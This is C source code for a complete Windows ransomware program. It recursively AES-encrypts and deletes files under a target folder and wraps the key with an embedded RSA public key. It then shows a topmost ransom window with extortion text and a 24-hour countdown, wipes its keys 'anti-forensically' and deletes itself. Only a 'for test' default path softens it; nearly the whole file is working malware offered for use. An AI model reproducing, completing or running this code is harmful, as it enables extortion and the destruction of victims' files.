#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <commctrl.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")

#define TARGET_PATH "C:\\tmp" // ENCRYPTION TARGET PATH
#define RSA_PUBLIC_KEY "YOUR PUBLIC KEY HERE" // keygen.sh generates public.pem
#define CHUNK_SIZE (1024 * 1024 * 4) // for large files

// for AES-256-CBC
BYTE aes_key[32];
BYTE aes_iv[16];

char extension[16]; // for random extension

// for GUI
HWND edit_id_handle;
HWND edit_key_handle;
HWND timer_handle;
HFONT font_handle;
HFONT font_timer_handle;
COLORREF background_color = RGB(230, 20, 20);
COLORREF text_color = RGB(255, 255, 255);
int countdown = 86400;
time_t deadline = 0;

// canary
BYTE canary[32];
BYTE encrypted_canary[32];

const char* warning_text = 
"Oops! All your files have been encrypted.\r\n\r\n"
"If you see this text, your files are no longer accessible.\r\n"
"Don't waste your time. No one will be able to recover them without our decryption service.\r\n\r\n"
"We guarantee that you can recover all your files safely.\r\n"
"All you need to do is submit the payment and get the decryption password.\r\n\r\n"
"If you terminate this program, your files can NEVER be decrypted.\r\n\r\n"
"Your personal installation key:";

const char* request_text = 
"\r\nIf you have already got the password, please enter it below.";

// prototype
void check_hash(BYTE* data, DWORD data_len, BYTE* output);
BOOL check_canary_hash(BYTE* key, BYTE* iv);
void encrypt_canary();
void crypt(const char* path, BOOL encryption_flag, BYTE* key, BYTE* iv);
void search(const char* path, BOOL encryption_flag, BYTE* key, BYTE* iv);
void gen_aes_keys();
void gen_extension();
void gen_random_text(BYTE* buffer, DWORD buffer_len);
void restore(HWND window_handle);
void self_destruction();
LRESULT CALLBACK Proc(HWND window_handle, UINT msg_number, WPARAM msg_wparam, LPARAM msg_lparam);
LRESULT CALLBACK EditProc(HWND window_handle, UINT msg_number, WPARAM msg_wparam, LPARAM msg_lparam, UINT_PTR id, DWORD_PTR data);

void check_hash(BYTE* data, DWORD data_len, BYTE* output) {
    BCRYPT_ALG_HANDLE alg_handle;
    BCRYPT_HASH_HANDLE hash_handle;

    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(alg_handle, &hash_handle, NULL, 0, NULL, 0, 0);
    BCryptHashData(hash_handle, data, data_len, 0);
    BCryptFinishHash(hash_handle, output, 32, 0);

    BCryptDestroyHash(hash_handle);
    BCryptCloseAlgorithmProvider(alg_handle, 0);
}

BOOL check_canary_hash(BYTE* key, BYTE* iv) {
    BCRYPT_ALG_HANDLE alg_handle;
    BCRYPT_KEY_HANDLE key_handle;
    DWORD out_len;
    BYTE decrypted[32];

    BYTE aes_iv_tmp[16];
    memcpy(aes_iv_tmp, iv, 16);

    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg_handle, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(alg_handle, &key_handle, NULL, 0, key, 32, 0);

    NTSTATUS status = BCryptDecrypt(key_handle, encrypted_canary, 32, NULL, aes_iv_tmp, 16, decrypted, 32, &out_len, 0);

    BCryptDestroyKey(key_handle);
    BCryptCloseAlgorithmProvider(alg_handle, 0);

    if (status != 0) return FALSE;

    BYTE canary_hash[32];
    BYTE decrypted_canary_hash[32];

    check_hash(canary, 32, canary_hash);
    check_hash(decrypted, 32, decrypted_canary_hash);

    if (memcmp(canary_hash, decrypted_canary_hash, 32) == 0) {
        return TRUE;
    }

    return FALSE;
}

void encrypt_canary() {
    BCRYPT_ALG_HANDLE alg_handle;
    BCRYPT_KEY_HANDLE key_handle;
    DWORD outfile_size;
    BYTE aes_iv_tmp[16];
    memcpy(aes_iv_tmp, aes_iv, 16);

    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg_handle, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(alg_handle, &key_handle, NULL, 0, aes_key, 32, 0);

    BCryptEncrypt(key_handle, canary, 32, NULL, aes_iv_tmp, 16, encrypted_canary, 32, &outfile_size, 0);

    BCryptDestroyKey(key_handle);
    BCryptCloseAlgorithmProvider(alg_handle, 0);
}

void restore(HWND window_handle) {
    char personal_installation_key[4096];
    GetWindowTextA(edit_key_handle, personal_installation_key, 4096);
    DWORD bin_len;
    if (CryptStringToBinaryA(personal_installation_key, 0, CRYPT_STRING_BASE64, NULL, &bin_len, NULL, NULL)) {
        BYTE* bin = malloc(bin_len);
        if (CryptStringToBinaryA(personal_installation_key, 0, CRYPT_STRING_BASE64, bin, &bin_len, NULL, NULL)) {
            if (bin_len == 48) {
                if (check_canary_hash(bin, bin + 32)) {
                    search(TARGET_PATH, FALSE, bin, bin + 32);
                    MessageBoxA(window_handle, "Thanks. Your all files are decrypted successfully.", "Success", MB_OK); 
                    self_destruction();
                }
            }
        }
        free(bin);
    }
    MessageBoxA(window_handle, "Invalid decryption code.", "Error", MB_OK | MB_ICONERROR);
}

void self_destruction() {
    char self_path[MAX_PATH];
    char cmd[MAX_PATH * 2];

    GetModuleFileNameA(NULL, self_path, MAX_PATH);
    sprintf(cmd, "/c timeout /t 2 & del \"%s\"", self_path);
    ShellExecuteA(NULL,"open", "cmd.exe", cmd, NULL, SW_HIDE);
    exit(0);
}

void crypt(const char* path, BOOL encryption_flag, BYTE* key, BYTE* iv) {
    HANDLE in_file_handle = CreateFileA(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (in_file_handle == INVALID_HANDLE_VALUE) return;

    DWORD file_size = GetFileSize(in_file_handle, NULL);
    if (file_size == 0) {
        CloseHandle(in_file_handle);
        return;
    }

    char out_filename[MAX_PATH];
    if (encryption_flag) {
        sprintf(out_filename, "%s%s", path, extension);
    } else {
        int filename_len = (int)(strlen(path) - strlen(extension));
        if (filename_len <= 0) {
            CloseHandle(in_file_handle);
            return;
        }
        memcpy(out_filename, path, filename_len);
        out_filename[filename_len] = '\0';
    }

    HANDLE out_file_handle = CreateFileA(out_filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (out_file_handle == INVALID_HANDLE_VALUE) {
        CloseHandle(in_file_handle);
        return;
    }

    BCRYPT_ALG_HANDLE alg_handle;
    BCRYPT_KEY_HANDLE key_handle;
    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(alg_handle, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGenerateSymmetricKey(alg_handle, &key_handle, NULL, 0, key, 32, 0);
    
    BYTE current_iv[16];
    memcpy(current_iv, iv, 16);

    BYTE* buffer = malloc(CHUNK_SIZE + 64);
    DWORD bytes_read;
    DWORD total_read = 0;

    while(ReadFile(in_file_handle, buffer, CHUNK_SIZE, &bytes_read, NULL) && bytes_read > 0) {
        total_read += bytes_read;
        BOOL is_last_chunk = (total_read >= file_size);
        DWORD flags = is_last_chunk ? BCRYPT_BLOCK_PADDING : 0;
        DWORD bytes_written;

        if (encryption_flag) {
            BCryptEncrypt(key_handle, buffer, bytes_read, NULL, current_iv, 16, buffer, CHUNK_SIZE + 64, &bytes_written, flags);
            WriteFile(out_file_handle, buffer, bytes_written, &bytes_written, NULL);
        } else {
            if (BCryptDecrypt(key_handle, buffer, bytes_read, NULL, current_iv, 16, buffer, CHUNK_SIZE + 64, &bytes_written, flags) == 0) {
                WriteFile(out_file_handle, buffer, bytes_written, &bytes_written, NULL);
            }
        }
    }

    free(buffer);
    CloseHandle(in_file_handle);
    CloseHandle(out_file_handle);
    BCryptDestroyKey(key_handle);
    BCryptCloseAlgorithmProvider(alg_handle, 0);

    DeleteFileA(path);
}

void search(const char* path, BOOL encryption_flag, BYTE* key, BYTE* iv) {
    char search_query[MAX_PATH];
    sprintf(search_query, "%s\\*", path);

    WIN32_FIND_DATAA found_data;
    HANDLE handle = FindFirstFileA(search_query, &found_data);
    if (handle == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(found_data.cFileName, ".") == 0 || strcmp(found_data.cFileName, "..") == 0) continue; // skip current directory and parent directory

        char full_path[MAX_PATH];
        sprintf(full_path, "%s\\%s", path, found_data.cFileName);
        
        // recursion
        if (found_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            search(full_path, encryption_flag, key, iv);
        } else {
            if (encryption_flag && !strstr(full_path, extension)) {
                crypt(full_path, TRUE, key, iv); // encryption
            } else if (!encryption_flag && strstr(full_path, extension)) {
                crypt(full_path, FALSE, key, iv); // decryption
            }
        }
    } while (FindNextFileA(handle, &found_data));

    FindClose(handle);
}

void gen_aes_keys() {
    BCRYPT_ALG_HANDLE alg_handle;
    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_RNG_ALGORITHM, NULL, 0);
    BCryptGenRandom(alg_handle, aes_key, 32, 0);
    BCryptGenRandom(alg_handle, aes_iv, 16, 0);
    BCryptCloseAlgorithmProvider(alg_handle, 0);
}

void gen_extension() {
    BCRYPT_ALG_HANDLE alg_handle;
    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_RNG_ALGORITHM, NULL, 0);

    BYTE random[4];
    BCryptGenRandom(alg_handle, random, 4, 0);
    sprintf(extension, ".%02X%02X%02X%02X", random[0], random[1], random[2], random[3]);
    
    BCryptCloseAlgorithmProvider(alg_handle, 0);
}

void gen_random_text(BYTE* buffer, DWORD buffer_len) {
    BCRYPT_ALG_HANDLE alg_handle;
    BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_RNG_ALGORITHM, NULL, 0);
    BCryptGenRandom(alg_handle, buffer, buffer_len, 0);
    BCryptCloseAlgorithmProvider(alg_handle, 0);
}

LRESULT CALLBACK Proc(HWND window_handle, UINT msg_number, WPARAM msg_wparam, LPARAM msg_lparam) {
    // UI
    if (msg_number == WM_CTLCOLORSTATIC || msg_number == WM_CTLCOLOREDIT || msg_number == WM_CTLCOLORBTN) {
        HDC hdc = (HDC)msg_wparam;
        SetTextColor(hdc, text_color);
        SetBkColor(hdc, background_color);
        return (INT_PTR)CreateSolidBrush(background_color);
    }

    // TIMER
    // for anti process suspension
    if (msg_number == WM_TIMER) {
        time_t now = time(NULL);
        int remaining = (int)(deadline - now);

        if (remaining <= 0) {
            KillTimer(window_handle, 1);
            MessageBoxA(window_handle, "Time is up. Your files are lost forever.", "Final Warning", MB_OK | MB_ICONSTOP);
            self_destruction();
        }

        char timer[64];
        sprintf(timer, "%02d:%02d:%02d", remaining/3600, (remaining%3600)/60, remaining%60);
        SetWindowTextA(timer_handle, timer);
    }

    // RESTORE
    if (msg_number == WM_COMMAND && LOWORD(msg_wparam) == 100) {
        restore(window_handle);
    }

    return DefWindowProcA(window_handle, msg_number, msg_wparam, msg_lparam);
}

LRESULT CALLBACK EditProc(HWND window_handle, UINT msg_number, WPARAM msg_wparam, LPARAM msg_lparam, UINT_PTR id, DWORD_PTR data) {
    if (msg_number == WM_CHAR && msg_wparam == VK_RETURN) { 
        restore(GetParent(window_handle));
        return 0; 
    }
    return DefSubclassProc(window_handle, msg_number, msg_wparam, msg_lparam);
}

int WINAPI WinMain(HINSTANCE instance_handle, HINSTANCE prev_instance, LPSTR option, int flag) {
    CreateDirectoryA(TARGET_PATH, NULL); // for test

    deadline = time(NULL) + 86400; // 24h

    gen_extension();

    gen_aes_keys();

    gen_random_text(canary, 32);

    encrypt_canary();

    BYTE raw[48];
    memcpy(raw, aes_key, 32);
    memcpy(raw + 32, aes_iv, 16);

    DWORD base64str_len;
    CryptBinaryToStringA(raw, 48, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64str_len);
    char* base64str = malloc(base64str_len);
    CryptBinaryToStringA(raw, 48, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64str, &base64str_len);

    DWORD rsa_bin_len;
    CryptStringToBinaryA(RSA_PUBLIC_KEY, 0, CRYPT_STRING_BASE64HEADER, NULL, &rsa_bin_len, NULL, NULL);
    BYTE* rsa_bin = malloc(rsa_bin_len);
    CryptStringToBinaryA(RSA_PUBLIC_KEY, 0, CRYPT_STRING_BASE64HEADER, rsa_bin, &rsa_bin_len, NULL, NULL);

    BCRYPT_KEY_HANDLE rsa_handle;
    PCERT_PUBLIC_KEY_INFO public_key_info;
    DWORD public_key_info_len;
    CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, rsa_bin, rsa_bin_len, CRYPT_DECODE_ALLOC_FLAG, NULL, &public_key_info, &public_key_info_len);
    CryptImportPublicKeyInfoEx2(X509_ASN_ENCODING, public_key_info, 0, NULL, &rsa_handle);

    DWORD cipher_len;
    BCryptEncrypt(rsa_handle, (BYTE*)base64str, (DWORD)strlen(base64str), NULL, NULL, 0, NULL, 0, &cipher_len, BCRYPT_PAD_PKCS1); // decrypt.sh rsa_padding_mode:pkcs1
    BYTE* encrypted_bin = malloc(cipher_len);
    BCryptEncrypt(rsa_handle, (BYTE*)base64str, (DWORD)strlen(base64str), NULL, NULL, 0, encrypted_bin, cipher_len, &cipher_len, BCRYPT_PAD_PKCS1);

    DWORD personal_installation_key_len;
    CryptBinaryToStringA(encrypted_bin, cipher_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &personal_installation_key_len);
    char* personal_installation_key = malloc(personal_installation_key_len);
    CryptBinaryToStringA(encrypted_bin, cipher_len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, personal_installation_key, &personal_installation_key_len);

    search(TARGET_PATH, TRUE, aes_key, aes_iv);

    // anti-forensic
    memset(aes_key, 0, 32);
    memset(aes_iv, 0, 16);

    // GUI phase
    WNDCLASSA window_class = {0};
    window_class.lpfnWndProc = Proc;
    window_class.hInstance = instance_handle;
    window_class.lpszClassName = "R";
    window_class.hbrBackground = CreateSolidBrush(background_color);
    RegisterClassA(&window_class);

    int width = 1000;
    int height = 900;
    HWND windows_handle = CreateWindowExA(
        WS_EX_TOPMOST, "R", "Terminal",
        WS_POPUP | WS_VISIBLE,
        (GetSystemMetrics(SM_CXSCREEN) - width)/2,
        (GetSystemMetrics(SM_CYSCREEN) - height)/2,
        width, height, 0, 0, 0, 0
    );

    font_handle = CreateFontA(23, 0,0,0, FW_NORMAL, 0,0,0,0,0,0, ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, "Book Antiqua");
    font_timer_handle = CreateFontA(115, 0,0,0, FW_NORMAL, 0,0,0,0,0,0, ANTIALIASED_QUALITY, FIXED_PITCH | FF_MODERN, "Book Antiqua");

    timer_handle = CreateWindowExA(0, "STATIC", "24:00:00", WS_CHILD | WS_VISIBLE | SS_CENTER, 50, 40, 900, 120, windows_handle, 0,0,0);
    SendMessage(timer_handle, WM_SETFONT, (WPARAM)font_timer_handle, 1);

    HWND warning_label = CreateWindowExA(0, "STATIC", warning_text, WS_CHILD | WS_VISIBLE, 50, 180, 900, 270, windows_handle, 0,0,0);
    SendMessage(warning_label, WM_SETFONT, (WPARAM)font_handle, 1);

    edit_id_handle = CreateWindowExA(0, "EDIT", personal_installation_key, WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY, 50, 455, 900, 160, windows_handle, 0,0,0);
    SendMessage(edit_id_handle, WM_SETFONT, (WPARAM)font_handle, 1);
    
    HWND request_label = CreateWindowExA(0, "STATIC", request_text, WS_CHILD | WS_VISIBLE, 50, 620, 900, 60, windows_handle, 0,0,0);
    SendMessage(request_label, WM_SETFONT, (WPARAM)font_handle, 1);
    
    edit_key_handle = CreateWindowExA(0, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_MULTILINE, 50, 690, 900, 60, windows_handle, 0,0,0);
    SendMessage(edit_key_handle, WM_SETFONT, (WPARAM)font_handle, 1);
    SetWindowSubclass(edit_key_handle, EditProc, 0, 0);
    
    HWND restore_btn = CreateWindowExA(0, "BUTTON", "RESTORE FILES", WS_CHILD | WS_VISIBLE, (width - 250)/2, 770, 250, 50, windows_handle, (HMENU)100, 0,0);
    SendMessage(restore_btn, WM_SETFONT, (WPARAM)font_handle, 1);
    
    SetTimer(windows_handle, 1, 1000, NULL);
    SetFocus(edit_key_handle);

    MSG msg;
    while (GetMessage(&msg, 0,0,0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DeleteObject(font_handle);
    DeleteObject(font_timer_handle);
    DeleteObject(window_class.hbrBackground);

    return 0;
}